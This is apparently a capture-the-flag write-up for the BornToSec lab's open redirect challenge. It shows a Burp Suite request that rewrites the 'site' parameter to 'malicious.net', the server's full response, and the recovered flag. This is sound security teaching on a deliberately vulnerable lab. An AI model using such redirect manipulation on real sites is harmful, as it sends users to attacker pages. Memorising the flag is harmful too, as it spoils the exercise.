# Open redirect
- a vulnerability where a web application allows attackers to redirect users to arbitrary URLs by manipulating a URL parameter
- if the application doesn't properly validate the 'site' parameter, an attacker can inject a malicious URL
- https://book.hacktricks.xyz/pentesting-web/open-redirect

<b>keywords</b>: redirect<br>
<b>attacked site</b>: http://borntosec.42/index.php?page=redirect&site=facebook

## Exploit
At the bottom of the main page, we observe that the social media buttons perform redirection to external sites:
```
http://borntosec.42/index.php?page=redirect&site=facebook
```
We intercept the GET request using <code>Burp Suite</code> and modify the redirection to point to our malicious site:
``` http
GET /index.php?page=redirect&site="malicious.net" HTTP/1.1
Host: 192.168.56.106
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://192.168.56.106/
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
```
This successfully returns the following response:
``` http
HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: Wed, 07 Aug 2024 23:47:17 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Content-Length: 2102

<!DOCTYPE HTML>
<html>
	<head>
		<title>BornToSec - Web Section</title>
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
		<meta name="description" content="" />
		<meta name="keywords" content="" />
		<!--[if lte IE 8]><script src="js/html5shiv.js"></script><![endif]-->
		<script src="js/jquery.min.js"></script>
		<script src="js/skel.min.js"></script>
		<script src="js/skel-layers.min.js"></script>
		<script src="js/init.js"></script>
		<noscript>
			<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
			<link rel="icon" type="image/x-icon" href="favicon.ico" />
			<link rel="stylesheet" href="css/skel.css" />
			<link rel="stylesheet" href="css/style.css" />
			<link rel="stylesheet" href="css/style-xlarge.css" />
		</noscript>
	</head>
	<body class="landing">
		<!-- Header -->
		<header id="header" >
								<a href=http://192.168.56.106><img src=http://192.168.56.106/images/42.jpeg height=82px width=82px/></a>
								<nav id="nav">
					<ul>
						<li><a href="index.php">Home</a></li>
						<li><a href="?page=survey">Survey</a></li>
						<li><a href="?page=member">Members</a></li>
					</ul>
				</nav>
			</header>

		<!-- Main -->
			<section id="main" class="wrapper">
				<div class="container" style="margin-top:75px">
<center><h2 style="margin-top:50px;">Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> 				</div>
			</section>
		<!-- Footer -->
			<footer id="footer">
				<div class="container">
					<ul class="icons">
						<li><a href="index.php?page=redirect&site=facebook" class="icon fa-facebook"></a></li>
						<li><a href="index.php?page=redirect&site=twitter" class="icon fa-twitter"></a></li>
						<li><a href="index.php?page=redirect&site=instagram" class="icon fa-instagram"></a></li>
					</ul>
					<ul class="copyright">
						<a href="?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"><li>&copy; BornToSec</li></a>
					</ul>
				</div>
			</footer>
	</body>
</html>
```
The flag is included in the response:
```
Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
```

## Flag
b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
